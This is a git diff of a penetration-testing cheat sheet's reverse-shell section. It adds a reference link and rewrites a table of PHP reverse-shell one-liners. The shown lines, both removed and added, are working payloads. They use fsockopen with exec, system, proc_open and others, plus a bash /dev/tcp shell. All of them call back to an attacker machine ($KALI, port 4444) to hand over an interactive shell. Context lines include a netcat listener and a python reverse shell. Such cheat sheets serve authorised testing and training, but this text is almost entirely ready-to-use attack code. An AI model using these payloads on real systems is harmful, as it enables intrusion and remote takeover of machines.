@@ -160,6 +160,8 @@ rlwrap nc -nlvp 4444
 
 ### 4.2. Various reverse shells
 
+Ref: <https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux>
+
 #### Netcat Traditional
 
 ```console
@@ -196,15 +198,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 |   |   |
 |---|---|
-|With `exec`|`php -r '$s=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`|
-|With `shell_exec`|`php -r '$s=fsockopen("$KALI",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`|
-|With backticks|``php -r '$s=fsockopen("$KALI",4444);`/bin/sh -i <&3 >&3 2>&3`;'``|
-|With `system`|`php -r '$s=fsockopen("$KALI",4444);system("/bin/sh -i <&3 >&3 2>&3");'`|
-|With `passthru`|`php -r '$s=fsockopen("$KALI",4444);passthru("/bin/sh -i <&3 >&3 2>&3", "r");'`|
-|With `popen`|`php -r '$s=fsockopen("$KALI",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`|
-|With `proc_open`|`php -r '$sock=fsockopen($KALI",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`|
-
-To run in a PHP file: change `php -r '$COMMAND_BLOCK'` to `<?php $COMMAND_BLOCK ?>`
+|Using `exec` is the most common method, but assumes that the file descriptor will be 3<br>Using this method may lead to instances where the connection reaches out to the listener and then closes|`php -r '$sock=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`|
+|Using `proc_open` makes no assumptions about what the file descriptor will be<br>See <https://security.stackexchange.com/a/198944> for more information|`<?php $sock=fsockopen("$KALI",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>`|
+|Using `exec` to call a `bash` reverse shell|`<?php exec("/bin/bash -c 'bash -i >/dev/tcp/$KALI/4444 0>&1'"); ?>`|
 
 #### PHP web shells
 
